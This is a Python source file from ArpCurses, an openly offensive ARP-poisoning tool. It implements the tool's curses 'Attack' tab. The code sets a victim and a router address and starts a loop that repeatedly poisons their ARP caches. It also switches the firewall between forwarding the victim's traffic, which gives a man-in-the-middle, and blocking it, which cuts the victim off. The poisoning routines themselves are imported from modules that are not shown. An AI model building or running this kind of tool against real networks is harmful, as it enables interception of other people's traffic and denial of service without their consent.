"""
    ArpCurses v1.0 - The ArpPoisoning tool. 
    Copyright (C) 2016  Giovanni D'Italia

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

import poison
import tools
import curses
import time
import threading
import utils
import curses.textpad

class ArpAttack():

    def __init__(self,stdscr,interface):
        
        self.base_X = 1
        self.base_Y = 2
        self.length_win = 80
        self.stdscr = stdscr
        
        

        self.interface = interface #physical interface
        self.attack_status = False #attack status
        self.forward_status = False #forward status
        
        #init poison module
        self.arp_poison=poison.ArpPoison(iface=self.interface)
        
    def main(self,victim,router):
        
        self.victim_ip = victim.gather().strip() #victim address
        if self.victim_ip != "":
            self.arp_poison.setVictim(self.victim_ip)
        self.router_ip = router.gather().strip() #router address
        if self.router_ip != "":
            self.arp_poison.setRouter(self.router_ip)

        while 1:
            self.__drawTabContent()
            
            #wait key's pression
            digit = self.stdscr.getkey()
            
            #arpcurses generic menu
            if digit == "2" or digit == "3" or digit == "4" or digit == "q":
                return digit
            
            #attack menu
            if digit == "v":    #set victim ip
                try:
                    self.victim_ip = victim.edit().strip() #remove empty
                    self.arp_poison.setVictim(self.victim_ip)    #space on strings
                except:
                    utils.infoBox(self.stdscr,self.base_Y+1,self.base_X+10,
                            " Invalid victim IP ","Error!")
                    self.victim_ip = ""

            if digit == "r":    #set router ip
                try:
                    self.router_ip = router.edit().strip()
                    self.arp_poison.setRouter(self.router_ip)
                except:
                    utils.infoBox(self.stdscr,self.base_Y+1,self.base_X+10,
                            " Invalid router IP ","Error!")
                    self.router_ip = ""
                
            if digit == "s":    #start/stop attack                
                if self.victim_ip == "":
                    utils.infoBox(self.stdscr,self.base_Y+1,self.base_X+10,
                        " You must set victim IP ","Error!")
                elif self.router_ip == "":
                    utils.infoBox(self.stdscr,self.base_Y+1,self.base_X+10,
                        " You must set router IP ","Error!")
                else:                    
                    self.attack_status = not self.attack_status
                    if self.attack_status:
                        try:
                            t = threading.Thread(target=self.__attack)
                            t.setDaemon(True)
                            t.start()
                        except:
                            self.attack_status = False
                            utils.infoBox(self.stdscr,
                                self.base_Y+1,self.base_X+1,
                                " Something going wrong, \
                                control your settings ",
                                "Error!")
    
            if digit == "d":    #forward/block connections
                try:
                    self.forward_status = not self.forward_status
                    if self.forward_status:
                        tools.firewallForwardConf(self.interface)
                    else:
                        tools.firewallBlockingConf(self.interface)
                except:
                        self.forward_status = not self.forward_status
                        utils.infoBox(self.stdscr,self.base_Y+1,self.base_X+1,
                            " Something going wrong, control your settings ",
                            "Error!")
            
    def __attack(self):
        """Manage attack loop"""
        while self.attack_status: #stop thread when attack_status is FALSE
            self.arp_poison.attack()
            time.sleep(5)
            
    def __drawTabContent(self):
        #clear screen
        self.stdscr.clear()

        #draw textbox with label
        utils.drawBox(self.stdscr,self.base_Y,self.base_X,20,self.victim_ip,
            "Victim")
        self.stdscr.addstr(self.base_Y,self.base_X+1,"V",
            curses.color_pair(2))
    
        utils.drawBox(self.stdscr,self.base_Y,self.base_X+23,20,self.router_ip,
            "Router")
        self.stdscr.addstr(self.base_Y, self.base_X+24, "R",
            curses.color_pair(2))
            
        utils.drawBox(self.stdscr,self.base_Y+4,self.base_X+23,20,
            self.interface,"iFace")

        #draw Start/Stop status box
        curses.textpad.rectangle(self.stdscr,
            self.base_Y,self.base_X+45, self.base_Y+6, self.base_X+58)
        self.stdscr.addstr(self.base_Y, self.base_X+45, "Start/Stop",
            curses.color_pair(1))
        self.stdscr.addstr(self.base_Y, self.base_X+45, "S",
            curses.color_pair(2))

        if self.attack_status == False:
            self.stdscr.addstr(self.base_Y+1, self.base_X+46, "            ",
                curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+2, self.base_X+46, "   START    ",
                curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+3, self.base_X+46, "   ATTACK   ",
                curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+4, self.base_X+46, "            ",
                curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+5, self.base_X+46, "            ",
                curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+11,0, "attack stopped...",
                curses.color_pair(2))
        else:
            self.stdscr.addstr(self.base_Y+1, self.base_X+46, "            ",
                curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+2, self.base_X+46, "    STOP    ",
                curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+3, self.base_X+46, "   ATTACK   ",
                curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+4, self.base_X+46, "            ",
                curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+5, self.base_X+46, "            ",
                curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+11,0, "running attack...",
                curses.color_pair(3))
            
        #draw forwarding status box    
        curses.textpad.rectangle(self.stdscr,
            self.base_Y+4,self.base_X, self.base_Y+6, self.base_X+20)
        self.stdscr.addstr(self.base_Y+4, self.base_X+1, "ForwarDing",
            curses.color_pair(1))
        self.stdscr.addstr(self.base_Y+4, self.base_X+7, "D",
            curses.color_pair(2))
            
        if self.forward_status == False:
            self.stdscr.addstr(self.base_Y+5, self.base_X+1,
                "       Active      ",curses.color_pair(3))
            self.stdscr.addstr(self.base_Y+12,0,
                "blocking packets...",curses.color_pair(2))              
        else:
            self.stdscr.addstr(self.base_Y+5, self.base_X+1,
                "     Deactive      ",curses.color_pair(2))
            self.stdscr.addstr(self.base_Y+12,0,
                "forwarding packets...",curses.color_pair(3))  
            
        #draw status info at the bottom of the tab
        self.stdscr.addstr(self.base_Y+10, 0, "Status:")

        #draw tabs navigator        
        utils.drawMenuBar(self.stdscr,self.length_win)
        self.stdscr.addstr(0, 0, "1.Attack",curses.color_pair(3))
        self.stdscr.refresh()
